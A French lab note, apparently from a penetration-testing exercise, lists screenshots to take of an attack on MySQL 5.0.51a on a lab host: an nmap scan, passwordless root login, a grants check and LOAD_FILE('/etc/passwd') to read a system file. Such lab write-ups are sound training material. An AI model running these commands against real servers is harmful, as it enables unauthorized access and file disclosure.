# Captures — MySQL 5.0.51a (MS2, port 3306)

Cible : `192.168.56.101` · Kali : `192.168.56.1`.
4 captures. Chaque capture montre **la commande tapée ET son résultat** (prompt visible).

## 01-recon-nmap.png

Commande :
```bash
nmap -sV -p 3306 192.168.56.101
```

Encadrer en rouge : la ligne `3306/tcp open mysql MySQL 5.0.51a-3ubuntu5`.

## 02-auth-root.png

Montrer l'erreur SSL d'abord puis le succès avec `--skip-ssl` (dans le même terminal) :
```bash
mysql -h 192.168.56.101 -u root -e "SELECT 1;"
mysql -h 192.168.56.101 -u root --skip-ssl -e "SELECT VERSION(); SELECT CURRENT_USER();"
```

Encadrer en rouge : la ligne `root@%` (preuve de la connexion root sans mot de passe).

## 03-privileges-file.png

Commande :
```bash
mysql -h 192.168.56.101 -u root --skip-ssl -e "SHOW GRANTS FOR CURRENT_USER();"
```

Encadrer en rouge : la ligne `GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' WITH GRANT OPTION`.

## 04-load-file.png

Commande :
```bash
mysql -h 192.168.56.101 -u root --skip-ssl -e "SELECT LOAD_FILE('/etc/passwd');"
```

Encadrer en rouge : la ligne `root:x:0:0:root:/root:/bin/bash` (début du contenu lu) — preuve
que le privilège FILE permet de lire un fichier arbitraire.
